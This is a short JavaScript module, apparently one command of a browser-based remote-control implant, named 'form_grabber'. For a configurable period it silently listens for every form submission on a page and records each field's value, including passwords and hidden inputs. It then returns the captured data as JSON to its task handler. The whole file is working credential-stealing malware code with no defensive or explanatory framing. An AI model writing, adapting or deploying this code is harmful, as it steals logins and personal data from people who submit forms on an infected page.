COMMANDS['form_grabber'] = async function(task) {
    var params = task.parameters;
    if (typeof params === 'string') {
        try { params = JSON.parse(params); } catch (e) { params = {}; }
    }
    var duration = (params && params.duration) ? parseInt(params.duration) : 120;

    var captured = [];

    function handler(e) {
        var form = e.target;
        if (!form || form.tagName !== 'FORM') return;

        var entry = {
            ts: new Date().toISOString(),
            action: form.action || window.location.href,
            method: (form.method || 'GET').toUpperCase(),
            fields: {}
        };

        var elements = form.elements;
        for (var i = 0; i < elements.length; i++) {
            var el = elements[i];
            if (!el.name && !el.id) continue;
            var name = el.name || el.id;
            var tag = el.tagName;

            if (tag === 'INPUT') {
                var type = (el.type || 'text').toLowerCase();
                if (type === 'password') {
                    entry.fields[name] = {type: 'password', value: el.value};
                } else if (type === 'checkbox' || type === 'radio') {
                    entry.fields[name] = {type: type, value: el.checked ? el.value : null, checked: el.checked};
                } else if (type === 'file') {
                    entry.fields[name] = {type: 'file', files: el.files ? el.files.length : 0};
                } else if (type !== 'submit' && type !== 'button' && type !== 'hidden') {
                    entry.fields[name] = {type: type, value: el.value};
                } else if (type === 'hidden') {
                    entry.fields[name] = {type: 'hidden', value: el.value};
                }
            } else if (tag === 'SELECT') {
                entry.fields[name] = {type: 'select', value: el.value};
            } else if (tag === 'TEXTAREA') {
                entry.fields[name] = {type: 'textarea', value: el.value};
            }
        }

        captured.push(entry);
    }

    document.addEventListener('submit', handler, true);

    await new Promise(function(resolve) {
        setTimeout(resolve, duration * 1000);
    });

    document.removeEventListener('submit', handler, true);

    return JSON.stringify({
        duration: duration + 's',
        formsSubmitted: captured.length,
        submissions: captured
    }, null, 2);
};
